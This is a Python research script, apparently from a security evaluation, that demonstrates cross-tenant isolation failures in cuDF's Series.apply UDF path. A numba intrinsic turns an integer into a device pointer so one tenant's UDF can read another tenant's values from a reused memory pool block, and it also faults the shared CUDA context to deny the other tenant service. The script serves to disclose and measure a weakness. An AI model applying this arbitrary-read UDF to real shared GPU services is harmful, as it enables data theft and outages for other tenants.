"""E1: confidentiality and availability failures through cuDF's UDF path.

The experiment runs each case in a fresh subprocess.  The confidentiality
case gives an untrusted ``Series.apply`` UDF the numeric address of a live
column owned by another tenant.  The UDF turns that integer into a pointer and
returns the value it reads.  The availability case performs the same load from
an invalid address and then asks the other tenant to execute a cuDF operation
in the poisoned CUDA context.

The numeric address is deliberate: tenant A records the address of its own
column, frees that column, and RMM reuses the same pool block for tenant B. A's
UDF later dereferences the stale address. E1 establishes the absence of memory
isolation once a tenant can retain its own device address. It does not claim
scalar UDF API discloses an address by itself.
"""

import argparse
import gc
import json
import os
import platform
import subprocess
import sys
from collections.abc import Callable, Sequence
from pathlib import Path
from types import ModuleType
from typing import Literal, NamedTuple, TypedDict

import numpy as np

from eval import ROOT, module_of

RESULT_PREFIX = "E1_RESULT="
POOL_BYTES = 256 * 1024 * 1024
TENANT_A_ROWS = 32
SECRET_ONE = 0x11223344556677
SECRET_TWO = 0x77665544332211
INVALID_ADDRESS = 8

# A numba intrinsic: the decorator maps the typing function to a lowered callable.
Intrinsic = Callable[[Callable[..., object]], Callable[..., object]]


class Imports(NamedTuple):
    """The GPU modules imported after the RMM pool is fixed, in dependency order."""

    rmm: ModuleType
    cudf: ModuleType
    numba: ModuleType
    numba_cuda: ModuleType
    ir: ModuleType
    cuda: ModuleType
    types: ModuleType
    intrinsic: Intrinsic


class Environment(TypedDict):
    python: str
    cudf: str
    numba: str
    numba_cuda: str
    rmm: str
    gpu: str
    compute_capability: list[int]


class ErrorRecord(TypedDict):
    type: str
    message: str


class LeakRecord(TypedDict):
    case: Literal["leak"]
    success: bool
    meaning: str
    address_knowledge: str
    allocator: str
    pool_bytes: int
    tenant_a_input_pointer: int
    tenant_a_stale_pointer: int
    tenant_b_pointer: int
    rmm_reused_stale_address: bool
    tenant_b_pointer_stable: bool
    secret_one: int
    secret_two: int
    first_unique: list[int]
    second_unique: list[int]
    rows: int
    environment: Environment


class CrashRecord(TypedDict):
    case: Literal["crash"]
    success: bool
    meaning: str
    invalid_address: int
    tenant_b_baseline_sum: int
    tenant_b_sum_after_fault: int | None
    udf_error: ErrorRecord | None
    tenant_b_error: ErrorRecord | None
    synchronize_error: ErrorRecord | None
    environment: Environment


class ChildRecord(TypedDict):
    case: str
    returncode: int
    result: dict[str, object] | None
    stderr: str
    success: bool


class AllCases(TypedDict):
    experiment: str
    success: bool
    cases: list[ChildRecord]


Result = LeakRecord | CrashRecord | AllCases


def _configure_cache() -> None:
    cache = Path(os.environ.get("OPGATE_E1_CACHE", "/tmp/opgate-e1-cache"))
    os.environ.setdefault("XDG_CACHE_HOME", str(cache))
    os.environ.setdefault("CUPY_CACHE_DIR", str(cache / "cupy"))
    os.environ.setdefault("NUMBA_CACHE_DIR", str(cache / "numba"))


_configure_cache()


def _imports() -> Imports:
    import rmm

    rmm.reinitialize(
        pool_allocator=True,
        initial_pool_size=POOL_BYTES,
        maximum_pool_size=POOL_BYTES,
    )

    import cudf
    import numba
    import numba_cuda
    from llvmlite import ir
    from numba import cuda, types
    from numba.cuda.extending import intrinsic

    return Imports(rmm, cudf, numba, numba_cuda, ir, cuda, types, intrinsic)


def _make_untrusted_load(
    ir: ModuleType, types: ModuleType, intrinsic: Intrinsic, byte_offset: int = 0
) -> Callable[..., object]:
    @intrinsic
    def load_i64(typing_context: object, address: object) -> tuple[object, Callable[..., object]]:
        if not isinstance(address, types.Integer):
            raise TypeError("load_i64 requires an integer device address")

        signature = types.int64(address)

        def codegen(
            context: object, builder: "ir.IRBuilder", sig: object, args: Sequence[object]
        ) -> object:
            del context, sig
            pointer_type = ir.PointerType(ir.IntType(64))
            pointer = builder.inttoptr(args[0], pointer_type)
            return builder.load(pointer, align=8)

        return signature, codegen

    def submitted_udf(_tenant_a_value: int, tenant_a_address: int) -> object:
        return load_i64(tenant_a_address + byte_offset)

    return submitted_udf


def _environment(
    cudf: ModuleType, numba: ModuleType, numba_cuda: ModuleType, rmm: ModuleType, cuda: ModuleType
) -> Environment:
    device = cuda.get_current_device()
    return {
        "python": platform.python_version(),
        "cudf": cudf.__version__,
        "numba": numba.__version__,
        "numba_cuda": numba_cuda.__version__,
        "rmm": rmm.__version__,
        "gpu": device.name,
        "compute_capability": list(device.compute_capability),
    }


def leak_case() -> LeakRecord:
    rmm, cudf, numba, numba_cuda, ir, cuda, types, intrinsic = _imports()

    tenant_a = cudf.Series(np.zeros(TENANT_A_ROWS, dtype=np.int64))
    released_by_a = cudf.Series(np.ones(TENANT_A_ROWS, dtype=np.int64))
    tenant_a_pointer = int(tenant_a._column.data.ptr)
    stale_pointer = int(released_by_a._column.data.ptr)
    del released_by_a
    gc.collect()
    cuda.synchronize()

    tenant_b = cudf.Series(np.full(TENANT_A_ROWS, SECRET_ONE, dtype=np.int64))
    tenant_b_pointer = int(tenant_b._column.data.ptr)
    if stale_pointer != tenant_b_pointer:
        raise RuntimeError(
            "the fixed RMM pool did not reuse tenant A's released block for tenant B"
        )
    submitted_udf = _make_untrusted_load(ir, types, intrinsic)

    first = tenant_a.apply(
        submitted_udf,
        args=(np.uint64(stale_pointer),),
    ).to_numpy()

    tenant_b.values.fill(SECRET_TWO)
    cuda.synchronize()
    pointer_after_update = int(tenant_b._column.data.ptr)
    second = tenant_a.apply(
        submitted_udf,
        args=(np.uint64(stale_pointer),),
    ).to_numpy()

    first_values = [int(value) for value in first]
    second_values = [int(value) for value in second]
    success = (
        tenant_a_pointer != tenant_b_pointer
        and stale_pointer == tenant_b_pointer
        and pointer_after_update == tenant_b_pointer
        and first_values == [SECRET_ONE] * TENANT_A_ROWS
        and second_values == [SECRET_TWO] * TENANT_A_ROWS
    )

    return {
        "case": "leak",
        "success": success,
        "meaning": (
            "Tenant A's Series.apply output changed when only tenant B's live cuDF column changed."
        ),
        "address_knowledge": (
            "Tenant A retained the numeric address of its own released cuDF "
            "column. RMM reused that exact block for tenant B, and A's UDF "
            "dereferenced the stale address; discovering B's address was not required."
        ),
        "allocator": type(rmm.mr.get_current_device_resource()).__name__,
        "pool_bytes": POOL_BYTES,
        "tenant_a_input_pointer": tenant_a_pointer,
        "tenant_a_stale_pointer": stale_pointer,
        "tenant_b_pointer": tenant_b_pointer,
        "rmm_reused_stale_address": stale_pointer == tenant_b_pointer,
        "tenant_b_pointer_stable": pointer_after_update == tenant_b_pointer,
        "secret_one": SECRET_ONE,
        "secret_two": SECRET_TWO,
        "first_unique": sorted(set(first_values)),
        "second_unique": sorted(set(second_values)),
        "rows": TENANT_A_ROWS,
        "environment": _environment(cudf, numba, numba_cuda, rmm, cuda),
    }


def _error_record(error: Exception | None) -> ErrorRecord | None:
    if error is None:
        return None
    return {"type": type(error).__name__, "message": str(error)}


def crash_case() -> CrashRecord:
    rmm, cudf, numba, numba_cuda, ir, cuda, types, intrinsic = _imports()
    submitted_udf = _make_untrusted_load(ir, types, intrinsic)

    tenant_a = cudf.Series(np.zeros(TENANT_A_ROWS, dtype=np.int64))
    tenant_b = cudf.Series(np.arange(TENANT_A_ROWS, dtype=np.int64))
    baseline = int(tenant_b.sum())

    udf_error: Exception | None = None
    try:
        result = tenant_a.apply(submitted_udf, args=(np.uint64(INVALID_ADDRESS),))
        result.to_numpy()
        cuda.synchronize()
    except Exception as error:
        udf_error = error

    tenant_b_error: Exception | None = None
    tenant_b_after: int | None = None
    try:
        tenant_b_after = int(tenant_b.sum())
        cuda.synchronize()
    except Exception as error:
        tenant_b_error = error

    synchronize_error: Exception | None = None
    try:
        cuda.synchronize()
    except Exception as error:
        synchronize_error = error

    success = (
        baseline == sum(range(TENANT_A_ROWS))
        and udf_error is not None
        and tenant_b_error is not None
        and synchronize_error is not None
    )
    return {
        "case": "crash",
        "success": success,
        "meaning": (
            "Tenant A's faulting Series.apply UDF prevented tenant B from using "
            "cuDF in the same CUDA context."
        ),
        "invalid_address": INVALID_ADDRESS,
        "tenant_b_baseline_sum": baseline,
        "tenant_b_sum_after_fault": tenant_b_after,
        "udf_error": _error_record(udf_error),
        "tenant_b_error": _error_record(tenant_b_error),
        "synchronize_error": _error_record(synchronize_error),
        "environment": _environment(cudf, numba, numba_cuda, rmm, cuda),
    }


def _emit(result: Result) -> None:
    print(RESULT_PREFIX + json.dumps(result, sort_keys=True), flush=True)


def _child_succeeded(returncode: int, parsed: dict[str, object] | None) -> bool:
    if returncode != 0 or parsed is None:
        return False
    success = parsed["success"]
    if not isinstance(success, bool):
        raise TypeError(f"the child's success is not a boolean: {success!r}")
    return success


def _run_child(case: str, timeout: int) -> ChildRecord:
    completed = subprocess.run(
        [sys.executable, "-m", module_of(__file__), f"{case}-child"],
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
        env=os.environ.copy(),
        cwd=ROOT,
    )
    parsed: dict[str, object] | None = None
    for line in completed.stdout.splitlines():
        if line.startswith(RESULT_PREFIX):
            loaded: object = json.loads(line.removeprefix(RESULT_PREFIX))
            if not isinstance(loaded, dict):
                raise TypeError(f"the child result is not an object: {loaded!r}")
            parsed = loaded
    return {
        "case": case,
        "returncode": completed.returncode,
        "result": parsed,
        "stderr": completed.stderr,
        "success": _child_succeeded(completed.returncode, parsed),
    }


def all_cases(timeout: int) -> AllCases:
    leak = _run_child("leak", timeout)
    crash = _run_child("crash", timeout)
    return {
        "experiment": "E1 on cuDF",
        "success": leak["success"] and crash["success"],
        "cases": [leak, crash],
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "case",
        choices=("all", "leak-child", "crash-child"),
        nargs="?",
        default="all",
    )
    parser.add_argument("--timeout", type=int, default=180)
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()

    result: Result
    if args.case == "leak-child":
        result = leak_case()
    elif args.case == "crash-child":
        result = crash_case()
    else:
        result = all_cases(args.timeout)

    _emit(result)
    if args.output is not None:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n")
    return 0 if result["success"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
